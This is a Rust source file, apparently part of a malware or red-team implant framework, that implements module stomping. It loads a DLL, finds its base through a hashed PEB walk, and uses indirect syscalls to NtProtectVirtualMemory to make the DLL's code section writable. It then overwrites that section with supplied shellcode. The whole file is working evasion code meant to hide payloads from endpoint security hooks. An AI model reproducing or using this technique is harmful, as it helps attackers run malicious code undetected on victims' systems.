/// LoadLibraryA is still needed to force the DLL into memory.
/// GetModuleHandleA is replaced by a PEB walk after load.
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;

#[cfg(target_os = "windows")]
pub unsafe fn stomp_module(dll_name: &[u8], shellcode: &[u8]) -> Option<*mut u8> {
    use crate::evasion::{syscalls::get_ssn, unhook::get_text_section};
    #[cfg(target_arch = "x86_64")]
    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base};

    // Force the target DLL to be loaded (needed before PEB walk can find it).
    LoadLibraryA(dll_name.as_ptr());

    // Walk PEB to resolve base — avoids GetModuleHandleA in the IAT.
    #[cfg(target_arch = "x86_64")]
    let module_base: *mut u8 = {
        let clean: Vec<u8> = dll_name.iter().take_while(|&&b| b != 0).copied().collect();
        peb_get_module_base(djb2_hash_lower(&clean)) as *mut u8
    };
    #[cfg(not(target_arch = "x86_64"))]
    let module_base: *mut u8 = {
        windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(dll_name.as_ptr()) as *mut u8
    };

    if module_base.is_null() { return None; }

    let (text_rva, text_size) = get_text_section(module_base as *const u8);
    if text_size < shellcode.len() { return None; }

    let target = module_base.add(text_rva);

    let (ssn, tramp) = get_ssn(b"NtProtectVirtualMemory")?;
    let ph: usize = usize::MAX; // -1 = current process

    let mut base  = target as usize;
    let mut sz    = shellcode.len();
    let mut old_p = 0u32;

    crate::evasion::syscalls::indirect_syscall(
        ssn, tramp, ph,
        &mut base as *mut usize as usize,
        &mut sz   as *mut usize as usize,
        0x40, // PAGE_EXECUTE_READWRITE
        &mut old_p as *mut u32 as usize, 0,
    );

    core::ptr::copy_nonoverlapping(shellcode.as_ptr(), target, shellcode.len());

    let mut base2 = target as usize;
    let mut sz2   = shellcode.len();
    crate::evasion::syscalls::indirect_syscall(
        ssn, tramp, ph,
        &mut base2 as *mut usize as usize,
        &mut sz2   as *mut usize as usize,
        0x20, // PAGE_EXECUTE_READ
        &mut old_p as *mut u32 as usize, 0,
    );

    Some(target)
}
